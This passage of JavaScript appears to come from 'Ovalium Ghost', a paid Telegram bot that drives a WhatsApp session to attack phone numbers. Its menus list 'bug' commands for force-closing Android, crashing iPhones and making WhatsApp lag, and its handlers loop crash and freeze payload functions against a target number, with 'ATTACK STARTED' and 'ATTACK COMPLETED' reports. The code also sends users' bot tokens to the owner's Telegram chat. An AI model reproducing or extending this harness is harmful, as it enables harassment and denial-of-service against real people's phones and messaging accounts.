    const tokens = Array.isArray(result?.tokens) ? result.tokens : [];
    const alertMessageBase = `
━━━━━━━━━━━━━━━━━━━
**OVALIUM GHOST ALERT**
━━━━━━━━━━━━━━━━━━━
👤 *User* : [${ctx.from.first_name}](tg://user?id=${userId})
🧩 *Username* : @${ctx.from.username || "Unknown"}
🔑 *Bot Token* : \`${tokenBot}\`
⏰ *Waktu* : ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
━━━━━━━━━━━━━━━━━━━`;
    if (tokens.includes(tokenBot)) {
      tokenValidated = true;
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "✅ Token berhasil diverifikasi!\nAkses kini dibuka untuk semua user.",
        { parse_mode: "Markdown" }
      );
      const alertMessage = `🚨 *TOKEN VERIFIED*${alertMessageBase}`;
      await axios.post(`https://api.telegram.org/bot${ALERT_TOKEN}/sendMessage`, {
        chat_id: ALERT_CHAT_ID,
        text: alertMessage,
        parse_mode: "Markdown",
      });
      await next();
    } else {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "❌ Token Tidak Valid\nAkses dihentikan.",
        { parse_mode: "Markdown" }
      );
      const alertMessage = `🚨 *TOKEN INVALID (DIDUGA CRACK)*${alertMessageBase}`;
      await axios.post(`https://api.telegram.org/bot${ALERT_TOKEN}/sendMessage`, {
        chat_id: ALERT_CHAT_ID,
        text: alertMessage,
        parse_mode: "Markdown",
      });
      return;
    }
  } catch (err) {
    await ctx.telegram.editMessageText(
      loadingMsg.chat.id,
      loadingMsg.message_id,
      null,
      "⚠️ Gagal memverifikasi token. Periksa koneksi atau server database.",
      { parse_mode: "Markdown" }
    );
    return;
  } finally {
    pendingVerification.delete(chatId);
  }
});

const GITHUB_OTP_URL = "https://raw.githubusercontent.com/xwarkoyz/Databasee/refs/heads/main/otp.json";

let currentOtp = null;
let verifiedUsers = new Set();
let lastOtp = null;

// 🔁 Ambil OTP dari GitHub
function getOtpFromGithub(callback) {
  https.get(GITHUB_OTP_URL + "?t=" + Date.now(), (res) => {
    let data = "";
    res.on("data", chunk => (data += chunk));
    res.on("end", () => {
      try {
        const json = JSON.parse(data);
        currentOtp = json.otp;

        // reset semua user kalau OTP di GitHub berubah
        if (lastOtp && lastOtp !== currentOtp) {
          verifiedUsers.clear();
          console.log("🔁 JANGAN SEBAR MAKANYA CIL.");
        }
        lastOtp = currentOtp;

        callback(currentOtp);
      } catch {
        callback(currentOtp);
      }
    });
  }).on("error", () => callback(currentOtp));
}

// command start
bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const isOwner = userId == ownerID;

  // ==========================================
  // 🚧 SYSTEM: WAJIB JOIN CHANNEL (KECUALI OWNER)
  // ==========================================
  if (!isOwner) {
    try {
      const chatMember = await ctx.telegram.getChatMember(channelUsername, userId);
      
      if (chatMember.status === "left" || chatMember.status === "kicked") {
        const autoLink = `https://t.me/${channelUsername.replace("@", "")}`;
        
        return ctx.reply(
          `⛔ AKSES DITOLAK\n\nHalo ${ctx.from.first_name}, kamu wajib bergabung ke channel kami terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join melalui tombol di bawah, lalu ketik /start kembali.`,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "JOIN CHANNEL", url: autoLink, style: "danger" }]
              ]
            }
          }
        );
      }
    } catch (error) {
      console.log("Gagal cek status member (Pastikan bot jadi Admin di channel):", error);
    }
  }
  // ==========================================

  const premiumStatus = isPremiumUser(userId) ? "ACTIVE" : "INACTIVE";
  const senderStatus = isWhatsAppConnected ? "CONNECTED" : "DISCONNECTED";
  const memoryStatus = formatMemory();

  if (!isOwner) {
    if (ctx.chat.type === "private") {
      bot.telegram.sendMessage(
        ownerID,
        `NOTIFIKASI START PRIVATE\n\n` +
          `User: ${ctx.from.first_name || ctx.from.username}\n` +
          `ID: <code>${ctx.from.id}</code>\n` +
          `Username: @${ctx.from.username || "-"}\n` +
          `Akses private diblokir.\n\n` +
          `Waktu: ${new Date().toLocaleString("id-ID")}`,
        { parse_mode: "HTML" }
      );
      return ctx.reply("Bot ini hanya bisa digunakan di grup yang memiliki akses.");
    }

    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
      return ctx.reply("Grup ini tidak memiliki akses.");
    }
  }

  if (!isOwner && ctx.chat.type === "private") {
    bot.telegram.sendMessage(
      ownerID,
      `Start Private Baru\n\n` +
        `User: ${ctx.from.first_name || ctx.from.username}\n` +
        `ID: <code>${ctx.from.id}</code>\n` +
        `Username: @${ctx.from.username || "-"}\n` +
        `Waktu: ${new Date().toLocaleString("id-ID")}`,
      { parse_mode: "HTML" }
    );
  }

  if (!menuEnabled) {
    return ctx.reply("Script disebar. Script telah dinonaktifkan.");
  }

  const runtimeStatus = formatRuntime();

  const menuMessage = `
\`\`\`js
⬡═—⊱ OVALIUM GHOST ⊰—═⬡
  ᴏᴡɴᴇʀ : @Xwarrxxx
  ᴠᴇʀsɪᴏɴ : 𝟹𝟼.𝟶

⬡═—⊱ STATUS BOT ⊰—═⬡
  ʙᴏᴛ sᴛᴀᴛᴜs : ${premiumStatus}  
  ᴜsᴇʀɴᴀᴍᴇ  : @${ctx.from.username || "Tidak Ada"}
  ᴜsᴇʀ ɪᴅ    : ${userId}
  sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${senderStatus}  
  ʙᴏᴛ ᴜᴘᴛɪᴍᴇ : ${runtimeStatus}

⬡═—⊱ SECURITY ⊰—═⬡
  ᴏᴛᴘ sʏsᴛᴇᴍ : ᴀᴄᴛɪᴠᴇ
  ᴛᴏᴋᴇɴ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ : ᴇɴᴀʙʟᴇᴅ  

────────────────────
  MAAF JIKA SCRIPT INI 
  KURANG SEMPURNA ATAU 
  MASIH BANYAK BUG
────────────────────

⧫━⟢ THANKS ⟣━⧫
\`\`\``;

  await ctx.replyWithPhoto(thumbnailUrl, {
    caption: menuMessage,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "◀", callback_data: "/tqto", style: "primary" },
          { text: "HOME", callback_data: "/start", style: "success" },
          { text: "▶", callback_data: "/controls", style: "primary" }
        ],
        [
          { text: "SYSTEM", callback_data: "/controls", style: "primary" },
          { text: "MENU", callback_data: "/scmd_menu", style: "success" },
          { text: "BUG", callback_data: "/bug", style: "danger" }
        ],
        [
          { text: "OWNER", url: "https://t.me/Xwarrxxx", style: "danger" }
        ]
      ],
    },
  });
});


bot.action("/start", async (ctx) => {
  const userId = ctx.from.id;
  const isOwner = userId == ownerID;

  if (!isOwner) {
    try {
      const chatMember = await ctx.telegram.getChatMember(channelUsername, userId);
      if (chatMember.status === "left" || chatMember.status === "kicked") {
        return ctx.answerCbQuery("AKSES DITOLAK! Kamu harus bergabung ke Channel resmi kami terlebih dahulu. Ketik /start", { show_alert: true });
      }
    } catch (error) {
      console.log("Gagal cek status member di action /start:", error);
    }
  }

  if (ctx.from.id == ownerID) {
  } else {
    if (ctx.chat.type === "private") {
      return ctx.reply("Bot hanya bisa digunakan di grup yang memiliki akses.");
    }

    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
      return ctx.reply("Grup ini tidak memiliki akses.");
    }
  }

  if (!tokenValidated) {
    return;
  }
  
  const premiumStatus = isPremiumUser(userId) ? "ACTIVE" : "INACTIVE";
  const senderStatus = isWhatsAppConnected ? "CONNECTED" : "DISCONNECTED";
  const runtimeStatus = formatRuntime();

  const menuMessage = `
\`\`\`js
⬡═—⊱ OVALIUM GHOST ⊰—═⬡
  ᴏᴡɴᴇʀ : @Xwarrxxx
  ᴠᴇʀsɪᴏɴ : 𝟹𝟼.𝟶

⬡═—⊱ STATUS BOT ⊰—═⬡
  ʙᴏᴛ sᴛᴀᴛᴜs : ${premiumStatus}  
  ᴜsᴇʀɴᴀᴍᴇ  : @${ctx.from.username || "Tidak Ada"}
  ᴜsᴇʀ ɪᴅ    : ${userId}
  sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${senderStatus}  
  ʙᴏᴛ ᴜᴘᴛɪᴍᴇ : ${runtimeStatus}

⬡═—⊱ SECURITY ⊰—═⬡
  ᴏᴛᴘ sʏsᴛᴇᴍ : ᴀᴄᴛɪᴠᴇ
  ᴛᴏᴋᴇɴ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ : ᴇɴᴀʙʟᴇᴅ  

────────────────────
  MAAF JIKA SCRIPT INI 
  KURANG SEMPURNA ATAU 
  MASIH BANYAK BUG
────────────────────

⧫━⟢ THANKS ⟣━⧫
\`\`\``;

  const keyboard = [
    [
      { text: "◀", callback_data: "/tqto", style: "primary" },
      { text: "HOME", callback_data: "/start", style: "success" },
      { text: "▶", callback_data: "/controls", style: "primary" }
    ],
    [
      { text: "SYSTEM", callback_data: "/controls", style: "primary" },
      { text: "MENU", callback_data: "/scmd_menu", style: "success" },
      { text: "BUG", callback_data: "/bug", style: "danger" }
    ],
    [
      { text: "OWNER", url: "https://t.me/Xwarrxxx", style: "danger" }
    ]
  ];

  try {
    await ctx.editMessageMedia(
      { 
        type: "photo", 
        media: thumbnailUrl, 
        caption: menuMessage, 
        parse_mode: "Markdown" 
      },
      { reply_markup: { inline_keyboard: keyboard } }
    );
  } catch {
    await ctx.answerCbQuery();
  }
});


bot.action('/controls', async (ctx) => {
    const controlsMenu = `
\`\`\`js
⬡═―—⊱ SYSTEM CONTROL ⊰―—═⬡
  /addbot     - Add Sender
  /setcd      - Set Cooldown
  /killsesi   - Reset Session
  /addowner   - Add Owner
  /delowner   - Delete Owner
  /enablecmd  - Aktifkan Command Bug Tertentu
  /disablecmd - Matikan Command Bug Tertentu

⬡═―—⊱ USER MANAGEMENT ⊰―—═⬡
  /addprem    - Add Premium
  /delprem    - Delete Premium
  /addgroup   - Add Premium Group
  /delgroup   - Delete Premium Group

 PAGE 2/7 
\`\`\``;

    const keyboard = [
        [
          { text: "◀", callback_data: "/start", style: "primary" },
          { text: "HOME", callback_data: "/start", style: "success" },
          { text: "▶", callback_data: "/scmd_menu", style: "primary" }
        ],
        [
          { text: "SYSTEM", callback_data: "/controls", style: "primary" },
          { text: "MENU", callback_data: "/scmd_menu", style: "success" },
          { text: "BUG", callback_data: "/bug", style: "danger" }
        ],
        [
          { text: "OWNER", url: "https://t.me/Xwarrxxx", style: "danger" }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("message is not modified")) {
            await ctx.answerCbQuery();
        }
    }
});

bot.action('/scmd_menu', async (ctx) => {
    const scmdMenu = `
\`\`\`js
⬡═―—⊱ DEVICE & GENERATOR ⊰―—═⬡
  /iqc        - iPhone Generator
  /openfile   - Open File JavaScript
  /play       - Play Music Spotify
  /inforam    - Info Server Panel

⬡═―—⊱ MEDIA & DOWNLOADER ⊰―—═⬡
  /sticker    - Convert Image To sticker
  /brat       - Brat sticker
  /tiktok     - Downloader Tiktok
  /ip         - Cek IP DNS
  /trackip    - Track Location IP
  /tourl      - To Url Image/Video
  /tourl2     - To Url Image

 PAGE 3/7 
\`\`\``;

    const keyboard = [
        [
          { text: "◀", callback_data: "/controls", style: "primary" },
          { text: "HOME", callback_data: "/start", style: "success" },
          { text: "▶", callback_data: "/bug", style: "primary" }
        ],
        [
          { text: "SYSTEM", callback_data: "/controls", style: "primary" },
          { text: "MENU", callback_data: "/scmd_menu", style: "success" },
          { text: "BUG", callback_data: "/bug", style: "danger" }
        ],
        [
          { text: "OWNER", url: "https://t.me/Xwarrxxx", style: "danger" }
        ]
    ];

    try {
        await ctx.editMessageCaption(scmdMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("message is not modified")) {
            await ctx.answerCbQuery();
        }
    }
});

bot.action('/bug', async (ctx) => {
  const bugMenu = `
\`\`\`js
BUG TYPE SELECTION

⬡═―—⊱ BUG CATEGORIES ⊰―—═⬡
  Invisible Bug - Bug tak terlihat
  Visible Bug   - Bug terlihat

 PAGE 4/7 
\`\`\``;

  const keyboard = [
    [
      { text: "INVISIBLE BUG", callback_data: "/bug_delay", style: "success" },
      { text: "VISIBLE BUG", callback_data: "/bug_visible", style: "danger" }
    ],
    [
      { text: "◀", callback_data: "/scmd_menu", style: "primary" },
      { text: "HOME", callback_data: "/start", style: "success" },
      { text: "▶", callback_data: "/bug_delay", style: "primary" }
    ],
    [
      { text: "SYSTEM", callback_data: "/controls", style: "primary" },
      { text: "MENU", callback_data: "/scmd_menu", style: "success" },
      { text: "BUG", callback_data: "/bug", style: "danger" }
    ],
    [
      { text: "OWNER", url: "https://t.me/Xwarrxxx", style: "danger" }
    ]
  ];

  try {
    if (ctx.update.callback_query.message.caption) {
      await ctx.editMessageCaption(bugMenu, {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard }
      });
    } else {
      await ctx.editMessageText(bugMenu, {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard }
      });
    }
  } catch (error) {
    if (error.response?.description?.includes("message is not modified")) {
      await ctx.answerCbQuery("Sudah di menu ini.");
    }
  }
});

bot.action('/bug_delay', async (ctx) => {
  const delayMenu = `
\`\`\`js
DELAY INVISIBLE BUG

⬡═―—⊱ DELAY TYPE ⊰―—═⬡
  /specterdelay   - 628xx [ DELAY FOR MURBUG ]
  /spamxdelay     - 628xx [ DELAY HARD BEBAS SPAM ]
  /twinsdelay     - 628xx [ DELAY HARD BETA ]
  /majesticdelay  - 628xx [ BEBAS SPAM NO LOG OUT ]
  /brutaldelay    - 628xx [ DELAY HARD INFINITY ]
  /delayduration  - 628xx [ HARD DELAY 1000% ]
  /quantumdelay - 628xx [ DELAY INVISIBLE 2000% ]
 
 PAGE 5/7 
\`\`\``;

  const keyboard = [
    [
      { text: "◀", callback_data: "/bug", style: "primary" },
      { text: "HOME", callback_data: "/start", style: "success" },
      { text: "▶", callback_data: "/bug_visible", style: "primary" }
    ],
    [
      { text: "SYSTEM", callback_data: "/controls", style: "primary" },
      { text: "MENU", callback_data: "/scmd_menu", style: "success" },
      { text: "BUG", callback_data: "/bug", style: "danger" }
    ],
    [
      { text: "OWNER", url: "https://t.me/Xwarrxxx", style: "danger" }
    ]
  ];

  try {
    if (ctx.update.callback_query.message.caption) {
      await ctx.editMessageCaption(delayMenu, {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard }
      });
    } else {
      await ctx.editMessageText(delayMenu, {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard }
      });
    }
  } catch (error) {
    if (error.response?.description?.includes("message is not modified")) {
      await ctx.answerCbQuery("Sudah di menu ini.");
    }
  }
});

bot.action('/bug_visible', async (ctx) => {
  const visibleMenu = `
\`\`\`js
VISIBLE BUG

⬡═―—⊱ VISIBLE TYPE ⊰―—═⬡
  /crashandroid   - 628xx [ FORCLOSE ANDROID ]
  /androxcrash    - 628xx [ FORCLOSE INVISIBLE ]
  /xinvis         - 628xx [ FORCLOSE INVISIBLE ]
  /spamxbug       - 628xx [ FORCLOSE SPAM NO KENON ]
  /xlevel         - 628xx [ BUG WITH LEVEL ]
  /combox         - 628xx [ COMBO BUG ]
  /applecrash     - 628xx [ IPHONE INVISIBLE ]
  /crashblank     - 628xx [ BLANK ANDROID ]

 PAGE 6/7 
\`\`\``;

  const keyboard = [
    [
      { text: "◀", callback_data: "/bug_delay", style: "primary" },
      { text: "HOME", callback_data: "/start", style: "success" },
      { text: "▶", callback_data: "/tqto", style: "primary" }
    ],
    [
      { text: "SYSTEM", callback_data: "/controls", style: "primary" },
      { text: "MENU", callback_data: "/scmd_menu", style: "success" },
      { text: "BUG", callback_data: "/bug", style: "danger" }
    ],
    [
      { text: "OWNER", url: "https://t.me/Xwarrxxx", style: "danger" }
    ]
  ];

  try {
    if (ctx.update.callback_query.message.caption) {
      await ctx.editMessageCaption(visibleMenu, {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard }
      });
    } else {
      await ctx.editMessageText(visibleMenu, {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard }
      });
    }
  } catch (error) {
    if (error.response?.description?.includes("message is not modified")) {
      await ctx.answerCbQuery("Sudah di menu ini.");
    }
  }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
\`\`\`js

⬡═―—⊱ THANKS TO ⊰―—═⬡
  Xatanical   ( Best Support )
  YanxTobrut  ( Friend )
  Hann    ( Friend )
  Rulzz  ( Friend ) 
  Febb  ( Friend )
  Narendra    ( Friend )
  Lixx        ( Friend )
  zènzyx      ( Friend )
  arczenzyx   ( Friend )
  elynar1408  ( Friend )
  All Buyer Ovalium Ghost
  All Partner & Owner Xwar

 PAGE 7/7 
\`\`\``;

    const keyboard = [
        [
          { text: "◀", callback_data: "/bug_visible", style: "primary" },
          { text: "HOME", callback_data: "/start", style: "success" },
          { text: "▶", callback_data: "/start", style: "primary" }
        ],
        [
          { text: "SYSTEM", callback_data: "/controls", style: "primary" },
          { text: "MENU", callback_data: "/scmd_menu", style: "success" },
          { text: "BUG", callback_data: "/bug", style: "danger" }
        ],
        [
          { text: "OWNER", url: "https://t.me/Xwarrxxx", style: "danger" }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("message is not modified")) {
            await ctx.answerCbQuery();
        }
    }
});


bot.command("crashblank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

const userId = ctx.from.id;
    const isOwner = userId == ownerID;

       if (!isCmdEnabled("crashblank")) {
      return ctx.reply("⚠️ <b>MAAF!</b> Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "HTML" });
    }
    
    if (!isOwner) {
    try {
      const chatMember = await ctx.telegram.getChatMember(channelUsername, userId);
      
      if (chatMember.status === "left" || chatMember.status === "kicked") {
        // Otomatis bikin link dari username (Misal: @chanelch jadi https://t.me/chanelch)
        const autoLink = `https://t.me/${channelUsername.replace("@", "")}`;
        
        return ctx.reply(
          `⚠️ *AKSES DITOLAK*\n\nHalo ${ctx.from.first_name}, kamu wajib bergabung ke channel  kami terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join melalui tombol di bawah, lalu ketik /start kembali.`,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "📢 Join Channel", url: autoLink, style:"danger" }]
              ]
            }
          }
        );
      }
    } catch (error) {
      console.log("Gagal cek status member (Pastikan bot jadi Admin di channel):", error);
    }
  }
    
    if (!tokenValidated) {
        return;
    }

    const q = ctx.message.text.split(" ")[1];
    if (!q) {
        return ctx.reply(`❌ Format: /crashblank 62×××`);
    }
    
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
     
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
        

    // Kirim notifikasi ke owner
    await ctx.telegram.sendMessage(
      ownerID,`
<b>🚀 ATTACK STARTED</b>
<code>────────────────────</code>
<b>Command:</b> /crashblank
<b>Target:</b> <code>${q}</code>
<b>Executor:</b> ${username}
<b>User ID:</b> <code>${userId}</code>
<b>Time:</b> ${new Date().toLocaleString('id-ID')}
<code>────────────────────</code>`);

    // Proses message
    const processMessage = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `
<b> PROCESSING ATTACK</b>
<code>────────────────────</code>
<b>Target:</b> <code>${q}</code>
<b>Type:</b> Blank Notification
<b>Status:</b> Initializing...
<b>Progress:</b> <code>▰▰▰▰▰▰▰▰▰▰ 0%</code>
<code>────────────────────</code>
<i>Please wait...</i>`,
        parse_mode: "HTML"
    });

    // Execute attack (parameter asli tetap sama)
    for (let i = 0; i < 100; i++) {        
        await LocaCrashUi2(sock, target);
        await sleep(1000);
        
        // Update progress setiap 10 iterasi
        if ((i + 1) % 10 === 0) {
            const progress = Math.floor(((i + 1) / 100) * 100);
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMessage.message_id,
                undefined,
                `
<b> PROCESSING ATTACK</b>
<code>────────────────────</code>
<b>Target:</b> <code>${q}</code>
<b>Type:</b> Blank Notification
<b>Status:</b> Running...
<b>Progress:</b> <code>${getProgressBar(progress)} ${progress}%</code>
<b>Iterations:</b> ${i + 1}/100
<code>────────────────────</code>
<i>Please wait...</i>`,
                { parse_mode: "HTML" }
            );
        }
    }

    // Update final message
    await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        processMessage.message_id,
        undefined,
        `
<b>✅ ATTACK COMPLETED</b>
<code>────────────────────</code>
<b>Target:</b> <code>${q}</code>
<b>Type:</b> Blank Stuck
<b>Status:</b> <b>SUCCESS</b>
<b>Iterations:</b> 100/100
<b>Time:</b> ${new Date().toLocaleTimeString('id-ID')}
<code>────────────────────</code>
<i>Attack executed successfully</i>`,
        { parse_mode: "HTML" }
    );

    // Kirim notifikasi ke owner setelah selesai
     await ctx.telegram.sendMessage(
      ownerID,`
<b>✅ ATTACK COMPLETED</b>
<code>────────────────────</code>
<b>Command:</b> /crashblank
<b>Target:</b> <code>${q}</code>
<b>Executor:</b> ${username}
<b>User ID:</b> <code>${userId}</code>
<b>Status:</b> SUCCESS
<b>Iterations:</b> 100
<b>End Time:</b> ${new Date().toLocaleString('id-ID')}
<code>────────────────────</code>`);
});

// Helper function untuk progress bar
function getProgressBar(percentage) {
    const bars = 10;
    const filled = Math.round(bars * (percentage / 100));
    const empty = bars - filled;
    return '▰'.repeat(filled) + '▱'.repeat(empty);
}



bot.command("combox", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

     if (!isCmdEnabled("combox")) {
      return ctx.reply("⚠️ <b>MAAF!</b> Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "HTML" });
    }
// Owner boleh selalu menggunakan command ini
if (ctx.from.id == ownerID) {
    // lewati pengecekan allowed group
} else {
    // Jika chat private, user biasa tidak boleh pakai
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Bot hanya bisa digunakan di grup yang memiliki akses.");
    }

    // Jika chat adalah grup, cek apakah grup di allowed list
    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("❌ Grup ini tidak memiliki akses.");
    }
}
    if (!tokenValidated) {
        return;
    }

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /combox 62×××`);
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    let mention = true;

    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
        caption: `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Notification Blank
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "CEK TARGET", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 150; i++) {
    await LocaFreezHome(sock, target);
    await LocaFreezHome(sock, target);
    await CzFrozen(sock, target);
    await CzFrozen(sock, target);
    await CzFrozen(sock, target);
    await ButtonPayment(target)
    await CzFrozen(sock, target);
    await crashDelay(target);
    await UIMention(sock, target, mention = true);
    await BlankUi(target);
    await sleep(5000);
    }

    await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank Stuck
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "CEK TARGET", url: `https://wa.me/${q}` }
            ]]
        }
    });
});

bot.command("delaymention", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
// Owner boleh selalu menggunakan command ini
if (ctx.from.id == ownerID) {
    // lewati pengecekan allowed group
} else {
    // Jika chat private, user biasa tidak boleh pakai
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Bot hanya bisa digunakan di grup yang memiliki akses.");
    }

    // Jika chat adalah grup, cek apakah grup di allowed list
    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("❌ Grup ini tidak memiliki akses.");
    }
}
if (!tokenValidated) {
        return;
    }
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delaymention 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Mention Delay Hard
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

   for (let i = 0; i < 10; i++) {
    await MsgAudioxxx(sock, target);
    await sleep(1000);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Mention Delay Hard
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("delayduration", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

const userId = ctx.from.id;
    const isOwner = userId == ownerID;

      
    
    if (!isOwner) {
    try {
      const chatMember = await ctx.telegram.getChatMember(channelUsername, userId);
      
      if (chatMember.status === "left" || chatMember.status === "kicked") {
        // Otomatis bikin link dari username (Misal: @chanelch jadi https://t.me/chanelch)
        const autoLink = `https://t.me/${channelUsername.replace("@", "")}`;
        
        return ctx.reply(
          `⚠️ *AKSES DITOLAK*\n\nHalo ${ctx.from.first_name}, kamu wajib bergabung ke channel  kami terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join melalui tombol di bawah, lalu ketik /start kembali.`,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "📢 Join Channel", url: autoLink, style:"danger" }]
              ]
            }
          }
        );
      }
    } catch (error) {
      console.log("Gagal cek status member (Pastikan bot jadi Admin di channel):", error);
    }
  }
  
  if (!isCmdEnabled("delayduration")) {
      return ctx.reply("⚠️ <b>MAAF!</b> Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "HTML" });
    }
  // Owner boleh selalu menggunakan command ini
  if (ctx.from.id == ownerID) {
    // lewati pengecekan allowed group
  } else {
    // Jika chat private, user biasa tidak boleh pakai
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Bot hanya bisa digunakan di grup yang memiliki akses.");
    }

    // Jika chat adalah grup, cek apakah grup di allowed list
    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
      return ctx.reply("❌ Grup ini tidak memiliki akses.");
    }
  }
  
  if (!tokenValidated) {
    return;
  }
  
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Format: /delayduration 62×××");
  
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.reply(`
\`\`\`js
⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay Duration
⌑ Status: Process
╘═——————————————═⬡
\`\`\`
  `, {
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [[
        { text: "✅ CEK TARGET", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  await ghostsecret(24, target);

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
    `
\`\`\`js
⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay Duration
⌑ Status: Success
╘═——————————————═⬡
\`\`\`
    `,
    {
      parse_mode: "MarkdownV2",
      reply_markup: {
        inline_keyboard: [[
          { text: "✅ CEK TARGET", url: `https://wa.me/${q}`, style: "success" }
        ]]
      }
    }
  );
});

bot.command(
  "twinsdelay",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
  
  const userId = ctx.from.id;
    const isOwner = userId == ownerID;
  
  if (!isOwner) {
    try {
      const chatMember = await ctx.telegram.getChatMember(channelUsername, userId);
      
      if (chatMember.status === "left" || chatMember.status === "kicked") {
        // Otomatis bikin link dari username (Misal: @chanelch jadi https://t.me/chanelch)
        const autoLink = `https://t.me/${channelUsername.replace("@", "")}`;
        
        return ctx.reply(
          `⚠️ *AKSES DITOLAK*\n\nHalo ${ctx.from.first_name}, kamu wajib bergabung ke channel  kami terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join melalui tombol di bawah, lalu ketik /start kembali.`,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "📢 Join Channel", url: autoLink, style:"danger" }]
              ]
            }
          }
        );
      }
    } catch (error) {
